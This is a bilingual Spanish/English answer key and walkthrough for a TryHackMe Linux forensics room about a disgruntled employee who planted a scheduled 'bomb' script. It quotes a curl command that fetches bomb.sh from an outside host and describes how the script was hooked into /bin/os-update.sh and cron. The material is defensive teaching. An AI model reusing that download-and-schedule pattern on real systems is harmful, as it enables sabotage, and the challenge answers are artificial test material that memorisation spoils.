# Disgruntled

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|---------|--------|--------------|---------|
| Easy | walkthrough | `disgruntled` | https://tryhackme.com/room/disgruntled | 01 Level Easy | TryHackMe | Linux forensics / apt history / bash / cron / análisis de logs | Investigación forense de un empleado descontento que plantó un mecanismo malicioso en un sistema Linux. |

---

**Contexto:** Sala de forensia en Linux que plantea la investigación de un usuario descontento (disgruntled). El análisis se apoya en el historial de apt, rutas de instalación (`/usr/bin/apt install dokuwiki`), el home del usuario (`/home/cybert`), cuentas sospechosas (`it-admin`), timestamps de creación (`Dec 28 06:27:34`) y la reconstrucción de cómo se descargó y agendó un script malicioso (`bomb.sh`) a través de `curl` y `/bin/os-update.sh`.

> **ES:** Forensia Linux de un empleado descontento: historial de apt y bash, análisis de timestamps, descarga de bomb.sh con curl y agendado en os-update.sh.
> **EN:** Linux forensics of a disgruntled employee: apt and bash history, timestamp analysis, bomb.sh download via curl and scheduling via os-update.sh.

## Solucionario

### Task 1: Introducción / Introduction

**Explicación:** Presentación de la sala de forensia sobre un empleado descontento. No requiere respuesta.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee la introducción de la sala. | `No answer needed` |

### Task 2: Contexto del incidente / Incident Context

**Explicación:** Se entrega el contexto del incidente y las instrucciones para acceder al sistema. No requiere respuesta.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee el contexto del incidente. | `No answer needed` |

### Task 3: Primeras evidencias / Initial Evidence

**Explicación:** Del historial del sistema se ve cómo se instaló el paquete DokuWiki con `/usr/bin/apt install dokuwiki` y se identifica el directorio home afectado: `/home/cybert`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué comando instaló el paquete DokuWiki? / Which command installed the DokuWiki package? | `/usr/bin/apt install dokuwiki` |
| 2 | ¿Cuál es el directorio home del usuario afectado? / What is the affected user's home directory? | `/home/cybert` |

### Task 4: Acceso y análisis de usuario / User Access and Analysis

**Explicación:** Se identifica la cuenta inusual `it-admin`, el timestamp de creación del artefacto sospechoso (`Dec 28 06:27:34`) y el nombre del script malicioso: `bomb.sh`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué cuenta de usuario resulta sospechosa? / Which user account is suspicious? | `it-admin` |
| 2 | ¿Qué timestamp de creación registra el artefacto sospechoso? / What creation timestamp does the suspicious artifact show? | `Dec 28 06:27:34` |
| 3 | ¿Cómo se llama el script malicioso encontrado? / What is the malicious script found called? | `bomb.sh` |

### Task 5: Mecanismo malicioso / Malicious Mechanism

**Explicación:** Se reconstruye el mecanismo: el script se descargó con `curl 10.10.158.38:8080/bomb.sh --output bomb.sh`, se vinculó a `/bin/os-update.sh` (modificado a las `Dec 28 06:29`) y el usuario dejó un archivo `goodbye.txt`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué comando curl descargó el script? / Which curl command downloaded the script? | `curl 10.10.158.38:8080/bomb.sh --output bomb.sh` |
| 2 | ¿Qué script del sistema se enlaza con el mecanismo malicioso? / Which system script is linked to the malicious mechanism? | `/bin/os-update.sh` |
| 3 | ¿Qué timestamp de modificación registra el mecanismo? / What modification timestamp does the mechanism show? | `Dec 28 06:29` |
| 4 | ¿Qué archivo dejó el usuario descontento? / What file did the disgruntled user leave behind? | `goodbye.txt` |

### Task 6: Ejecución agendada / Scheduled Execution

**Explicación:** El mecanismo malicioso está agendado para ejecutarse automáticamente a una hora concreta: las `08:00 AM`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿A qué hora está programada la ejecución del mecanismo? / At what time is the mechanism scheduled to run? | `08:00 AM` |

### Task 7: Conclusión / Conclusion

**Explicación:** Cierre de la sala con el resumen de la investigación forense. No requiere respuesta.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee la conclusión de la sala. | `No answer needed` |

---

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee la introducción de la sala. | `No answer needed` |
| 2 | Lee el contexto del incidente. | `No answer needed` |
| 3 | ¿Qué comando instaló el paquete DokuWiki? | `/usr/bin/apt install dokuwiki` |
| 4 | ¿Cuál es el directorio home del usuario afectado? | `/home/cybert` |
| 5 | ¿Qué cuenta de usuario resulta sospechosa? | `it-admin` |
| 6 | ¿Qué timestamp de creación registra el artefacto sospechoso? | `Dec 28 06:27:34` |
| 7 | ¿Cómo se llama el script malicioso encontrado? | `bomb.sh` |
| 8 | ¿Qué comando curl descargó el script? | `curl 10.10.158.38:8080/bomb.sh --output bomb.sh` |
| 9 | ¿Qué script del sistema se enlaza con el mecanismo malicioso? | `/bin/os-update.sh` |
| 10 | ¿Qué timestamp de modificación registra el mecanismo? | `Dec 28 06:29` |
| 11 | ¿Qué archivo dejó el usuario descontento? | `goodbye.txt` |
| 12 | ¿A qué hora está programada la ejecución del mecanismo? | `08:00 AM` |
| 13 | Lee la conclusión de la sala. | `No answer needed` |

---

**Metodología:** La investigación forense sigue la línea de tiempo del incidente: se empieza por el historial del sistema (instalación de DokuWiki con `/usr/bin/apt install dokuwiki` y home `/home/cybert`), se localiza la cuenta sospechosa (`it-admin`) y el artefacto con su timestamp de creación (`Dec 28 06:27:34`). Después se reconstruye la descarga del script (`curl 10.10.158.38:8080/bomb.sh --output bomb.sh`), su enlace con `/bin/os-update.sh` (modificado a `Dec 28 06:29`), el archivo `goodbye.txt` y el agendado de la ejecución a las `08:00 AM`.

### Cadena de ataque / Attack Chain

```text
Instalación de DokuWiki (/usr/bin/apt install dokuwiki) -> usuario afectado /home/cybert -> cuenta sospechosa it-admin -> creación de bomb.sh (Dec 28 06:27:34) -> descarga con curl (10.10.158.38:8080/bomb.sh) -> enlace con /bin/os-update.sh (Dec 28 06:29) -> goodbye.txt -> ejecución agendada a las 08:00 AM
```

**Learning chain:** apt history → rutas (dokuwiki, /home/cybert) → usuarios (it-admin) → timestamps → curl (descarga de bomb.sh) → /bin/os-update.sh → goodbye.txt → cron/ejecución (08:00 AM).

**Lección:** *La línea de tiempo lo es todo en forensia: correlacionar timestamps de creación, comandos de instalación y descarga, y el agendado de la ejecución permite reconstruir exactamente cómo un empleado descontento dejó preparada una "bomba" en el sistema.*

**MITRE ATT&CK:** T1059 (Command and Scripting Interpreter), T1053 (Scheduled Task/Job), T1078 (Valid Accounts)

**Fuente:** [TryHackMe - Disgruntled](https://tryhackme.com/room/disgruntled)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.